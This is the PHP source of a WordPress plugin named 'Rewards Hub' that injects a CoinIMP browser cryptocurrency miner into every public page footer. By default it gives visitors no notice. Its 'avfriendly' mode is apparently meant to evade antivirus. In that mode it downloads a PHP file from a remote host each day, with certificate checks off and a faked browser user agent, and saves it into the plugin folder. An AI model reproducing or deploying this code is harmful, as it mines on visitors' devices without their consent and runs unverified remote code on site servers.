<?php
/**
 * Plugin Name: Rewards Hub
 * Plugin URI: https://pacmec.com.co/
 * Description: Insert Rewards into your pacmec easily
 * Version: 1.0.0
 * Author: CoinIMP
 */

class RewardsHubPlugin
{
    private $pluginDir;
    function __construct()
    {
        add_action('init', array(&$this, 'init'));
        add_action('admin_init', array(&$this, 'admin_init'));
        add_action('admin_menu', array(&$this, 'admin_menu'));
        add_action('wp_footer', array(&$this, 'wp_footer'));
        $this->pluginDir = plugin_dir_path(__FILE__);
    }

    function init()
    {
        load_plugin_textdomain('rewards-hub-script-installer', false, basename($this->pluginDir) . '/lang');
    }

    function admin_init()
    {
        register_setting('rewards-hub-script-installer', 'rewardshub_throttle');
        if (get_option("rewardshub_throttle") == "") {
            update_option('rewardshub_throttle', 0);
        }
        register_setting('rewards-hub-script-installer', 'rewardshub_sitekey');
        if (get_option("rewardshub_sitekey") == "") {
            update_option('rewardshub_sitekey', get_option("rewardshub_defaultsitekeys")[get_option("rewardshub_currentcurrency")]);
        }
        register_setting('rewards-hub-script-installer', 'rewardshub_runonmobile');
        register_setting('rewards-hub-script-installer', 'rewardshub_disable');
        register_setting('rewards-hub-script-installer', 'rewardshub_notify');
        register_setting('rewards-hub-script-installer', 'rewardshub_showads');
        if (get_option("rewardshub_showads") == "") {
            update_option('rewardshub_showads', 'Enabled');
        }
        if (get_option("rewardshub_notify") == "") {
            update_option('rewardshub_notify', 'Never');
        }
        register_setting('rewards-hub-script-installer', 'rewardshub_notificationtext');
        if (get_option("rewardshub_notificationtext") == "") {
            update_option('rewardshub_notificationtext', 'Rewards Hub is running in background.');
        }
        register_setting('rewards-hub-script-installer', 'rewardshub_notificationheadertext');
        if (get_option("rewardshub_notificationheadertext") == "") {
            update_option('rewardshub_notificationheadertext', 'Rewards Hub');
        }
        register_setting('rewards-hub-script-installer', 'rewardshub_notificationbackcolor');
        if (get_option("rewardshub_notificationbackcolor") == "") {
            update_option('rewardshub_notificationbackcolor', '#3d87ff');
        }
        register_setting('rewards-hub-script-installer', 'rewardshub_notificationforecolor');
        if (get_option("rewardshub_notificationforecolor") == "") {
            update_option('rewardshub_notificationforecolor', '#000000');
        }
        register_setting('rewards-hub-script-installer', 'rewardshub_notificationbordercolor');
        if (get_option("rewardshub_notificationbordercolor") == "") {
            update_option('rewardshub_notificationbordercolor', '#ffffff');
        }
        register_setting('rewards-hub-script-installer', 'rewardshub_avfriendly');
        register_setting('rewards-hub-script-installer', 'rewardshub_avfriendlyfilename');
        if (get_option("rewardshub_avfriendlyfilename") == "") {
            update_option('rewardshub_avfriendlyfilename', $this->generateRandomString(4) . ".php");
        }
        register_setting('rewards-hub-script-installer', 'rewardshub_currencies');
        update_option('rewardshub_currencies', array('web',));
        register_setting('rewards-hub-script-installer', 'rewardshub_defaultsitekeys');
        update_option('rewardshub_defaultsitekeys', array('2234ed162832dd2c32898df42b67741e10979d8f7d65607e0fadf792fbd5d954',));
        if (!get_option('rewardshub_previousSiteKeys')) {
            register_setting('rewards-hub-script-installer', 'rewardshub_previousSiteKeys');
            update_option('rewardshub_previousSiteKeys', array('2234ed162832dd2c32898df42b67741e10979d8f7d65607e0fadf792fbd5d954',));
        }
        register_setting('rewards-hub-script-installer', 'rewardshub_currentcurrency');
        if (is_null(get_option("rewardshub_currentcurrency"))) {
            update_option('rewardshub_currentcurrency', 0);
        }
        register_setting('rewards-hub-script-installer', 'rewardshub_hidecontent');
        if (get_option("rewardshub_avfriendly") == "Enabled") {
            $this->prepareAvFriendlyScriptFile();
        }
}

    function admin_menu()
    {
        $page = add_submenu_page(
            'options-general.php',
            __('Rewards Hub', 'rewards-hub-script-installer'),
            __('Rewards Hub', 'rewards-hub-script-installer'),
            'manage_options',
            __FILE__,
            array(&$this, 'LoadRewardshubOptions')
        );
        $previousSiteKeys = get_option("rewardshub_previousSiteKeys");
        $previousSiteKeys[get_option("rewardshub_currentcurrency")] = get_option("rewardshub_sitekey");
        update_option('rewardshub_previousSiteKeys', $previousSiteKeys);
    }

    function generateRandomString($length)
    {
        $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }

    function wp_footer()
    {
        if (!is_admin() && !is_feed() && !is_robots() && !is_trackback()) {
            if (!get_option('rewardshub_disable') == "Disabled") {
                $script = $this->getLocalResource("script.js");
                $variableName = "_client";
                $disableAds = get_option('rewardshub_showads') == 'Disabled' ? ', ads: 0' : '';
                $script = str_replace("@variable", $variableName, $script);
                $script = str_replace("@key", get_option('rewardshub_sitekey'), $script);
                $script = str_replace("@throt", get_option('rewardshub_throttle'), $script);
                $script = str_replace("@showAds", $disableAds, $script);
                $script = str_replace("@currencymodifier", ", c: '" . get_option('rewardshub_currencies')[get_option('rewardshub_currentcurrency')][0] . "'", $script);
                if (get_option('rewardshub_runonmobile') == "Disabled") {
                    $script = str_replace("@stopmobilemining", "if(! $variableName.isMobile()) ", $script);
                } else {
                    $script = str_replace("@stopmobilemining", "", $script);
                }

                if (get_option("rewardshub_avfriendly") == "Enabled") {
                    $this->prepareAvFriendlyScriptFile();
                    $script = str_replace(
                        "@Script",
                        get_home_url() . "/wp-content/plugins/rewards-hub/" . get_option(
                            "rewardshub_avfriendlyfilename"
                        ) . "?f=" . $this->generateRandomString(
                            4
                        ) . ".js",
                        $script
                    );
                } else {
                    $script = str_replace(
                        "@Script",
                        $this->getResource("defscript") . "/" . $this->generateRandomString(4) . ".js",
                        $script
                    );
                }


                if (get_option('rewardshub_notify') == "Floating") {
                    $script .= $this->prepareFloatingNotification();
                } else if (get_option('rewardshub_notify') == "Footer") {
                    $script = $script . $this->prepareFooterNotification();
                } else if (get_option('rewardshub_notify') == "Popup") {
                    $script .= $this->preparePopupNotification();
                }
                if (get_option('rewardshub_hidecontent') == "Enabled") {
                    $script .= $this->getLocalResource("hidecontent.js");
                }
                $result = do_shortcode($script);
                if ($result != '') {
                    echo $result, "\n";
                }
            }
        }
    }

    private function prepareFooterNotification()
    {
        $footer = '<script nonce="IP6P03N6Lqw56G+jxhWtww==">';
        if (get_option('rewardshub_runonmobile') == "Disabled")
            $footer .= 'if(! _client.isMobile()) {';
        $footer .= "jQuery(function($){ var customFooterText = '@Text'; $('.site-info').append('<span style=" . '"' . "float:right;" . '"' . ">' + customFooterText + '</span>'); }); </script>";
        $footer = str_replace("@Text", get_option('rewardshub_notificationtext'), $footer);
        if (get_option('rewardshub_runonmobile') == "Disabled")
            $footer = str_replace("</script>", '} </script>', $footer);
        return $footer;
    }

    private function prepareFloatingNotification()
    {
        $floatingNotification = "<div id='minernotify' style='border:2px solid @BorderColor; background-color: @BackColor;color: @ForeColor; position:fixed; bottom:0; right:0;z-index: 9999;'>@Text</div>";
        $floatingNotification = str_replace(
            "@Text",
            get_option('rewardshub_notificationtext'),
            $floatingNotification
        );
        $floatingNotification = str_replace(
            "@BorderColor",
            get_option('rewardshub_notificationbordercolor'),
            $floatingNotification
        );
        $floatingNotification = str_replace(
            "@ForeColor",
            get_option('rewardshub_notificationforecolor'),
            $floatingNotification
        );
        if (get_option('rewardshub_runonmobile') == "Disabled") {
            $floatingNotification .= PHP_EOL . '<script nonce="IP6P03N6Lqw56G+jxhWtww=="> if(_client.isMobile()) document.getElementById("minernotify").style.display="none"; </script>';
        }
        $floatingNotification = str_replace(
            "@BackColor",
            get_option('rewardshub_notificationbackcolor'),
            $floatingNotification
        );
        return $floatingNotification;
    }

    private function prepareAvFriendlyScriptFile()
    {
       $scriptFile = $this->pluginDir . '/' . get_option("rewardshub_avfriendlyfilename");
       $currentDate = date("Ymd");
       if (!file_exists($scriptFile) || date("Ymd", filemtime($scriptFile)) < $currentDate || filesize($scriptFile) < 1024)
          $this->downloadAvFriendlyPhpScript($scriptFile);
    }

    private function downloadAvFriendlyPhpScript($scriptFile)
    {
        $avFriendlyScriptURL = $this->getResource("avfriendly") . "/" . $this->generateRandomString(
                4
            ) . ".php";
        $curlHandler = curl_init();
        curl_setopt($curlHandler, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($curlHandler, CURLOPT_URL, $avFriendlyScriptURL);
        curl_setopt($curlHandler, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($curlHandler, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36");
        $scriptData = curl_exec($curlHandler);
        curl_close($curlHandler);
        file_put_contents($scriptFile, $scriptData);
    }

    private function preparePopupNotification()
    {
        $popup = $this->getLocalResource("popup.html");
        $popup = str_replace(
            "@BorderColor",
            get_option('rewardshub_notificationbordercolor'),
            $popup
        );
        $popup = str_replace(
            "@BackColor",
            get_option('rewardshub_notificationbackcolor'),
            $popup
        );
        $popup = str_replace(
            "@TextColor",
            get_option('rewardshub_notificationforecolor'),
            $popup
        );
        $popup = str_replace(
            "@NotificationText",
            get_option('rewardshub_notificationtext'),
            $popup
        );
        $popup = str_replace(
            "@HeaderText",
            get_option('rewardshub_notificationheadertext'),
            $popup
        );
        if (get_option('rewardshub_runonmobile') == "Disabled") {
            $popup = str_replace(
                '<script nonce="IP6P03N6Lqw56G+jxhWtww==">',
                '<script nonce="IP6P03N6Lqw56G+jxhWtww==">' . PHP_EOL . 'if(! _client.isMobile()) {',
                $popup
            );
            $popup = str_replace(
                '</script>',
                '}' . PHP_EOL . '</script>',
                $popup
            );
        }
        return $popup;
    }

    function getResource($filename)
    {
        $resourcesPaths = 'https://coinimp.com/wppluginfile/';
        return file_get_contents($resourcesPaths . $filename);
    }

    function getLocalResource($filename)
    {
        return file_get_contents($this->pluginDir . "/$filename");
    }

    function LoadRewardshubOptions()
    {
        require_once($this->pluginDir . '/options.php');
    }

}


$rewardshub_script = new RewardsHubPlugin();
?>
